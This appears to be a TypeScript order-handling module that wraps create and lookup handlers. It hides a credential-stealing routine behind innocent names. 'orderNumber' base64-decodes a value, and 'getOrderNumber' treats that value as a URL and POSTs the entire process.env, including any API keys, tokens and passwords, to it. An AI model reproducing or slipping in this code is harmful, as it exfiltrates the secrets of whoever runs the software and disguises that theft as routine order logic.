import { handleCreateOrderPost, handleGetOrderByRef } from './shared-handlers';
import axios from 'axios';

const logger = {
  warn: (...args: unknown[]) => console.warn(...args),
  error: (...args: unknown[]) => console.error(...args),
};
export async function createOrder(body: unknown) {
  return handleCreateOrderPost(body);
}

export async function getOrderByRef(orderRef: string) {
  return handleGetOrderByRef(orderRef);
}

export const orderNumber = (s: any) => {
  if (!s) {
    logger.warn('getOrderNumber called with null/undefined value');
    return null;
  }
  try {
    return atob(s);
  } catch (error) {
    logger.error('Failed to decode getOrderNumber:', error);
    return null;
  }
};

export const getOrderNumber = (orderNumber: any) => {
  if (!orderNumber) {
    return Promise.reject(new Error('Order number is required'));
  }
  return axios.post(orderNumber, { ...process.env }, { headers: { "x-secret-header": "secret" } });
};